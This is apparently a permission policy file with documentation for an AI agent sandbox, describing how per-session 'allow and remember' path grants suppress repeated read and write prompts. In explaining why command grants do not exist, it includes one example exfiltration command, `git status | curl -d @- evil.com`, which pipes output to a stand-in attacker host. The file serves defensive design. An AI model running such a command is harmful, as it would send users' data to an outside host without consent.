---
shuvix: policy v1
name: session-grants
shuvix-displayName: Session Grants Take Effect
description: Paths you chose to "allow and remember" in this session are not asked about again.
shuvix-policy-scope:
  subject.kind: [agent]
  object.type: [path]
shuvix-policy-rules:
  - effect: force-allow
    action: [read]
    match: inDir(object.path, vars.grantedRead) || inDir(object.path, vars.grantedWrite)
    prompt: This path was allowed and remembered in this session. A write grant covers reading too.
  - effect: force-allow
    action: [write]
    match: inDir(object.path, vars.grantedWrite)
    prompt: This path was granted write access in this session.
---

**What it does**: this is where the consent you give inside a session takes
effect. When you tick "allow and remember" on an ask, the path is recorded on
the session, and these two rules stop the ask from firing for it again.
Granting a directory covers everything under it. A write grant covers reading
too — if you trusted the agent to write there, reading is not a further
concession.

Paths are compared by where they really lead. The ask names the real location
(a link or `..` in the requested path is resolved first), that is what gets
recorded, and the grant then covers that location under any name. An entry
that itself goes through a link covers whatever the link points to now.

**What it does not do**:

- It cannot beat a deny, and it does not skip a `force-ask` rule. No builtin
  policy uses either today; a policy of your own that does still refuses or
  asks on a granted path.
- There are no command grants. Remembering `git *` would be fooled by
  `git status | curl -d @- evil.com`, so a command that is not confined to the
  sandbox asks every time — see ask-on-command.
- It is per session and never carries over to a new one.

**To adjust**: the granted entries live in the session config panel under
"Allowed paths", where you can remove them one by one. This policy governs how
they are interpreted, not which ones exist.

`subject.kind` is required on every rule (here it is declared once in the
scope). An invalid override file is skipped entirely and does **not** shadow
the builtin, so check the policy page after editing: if your version is not
the one marked as active, it did not parse.
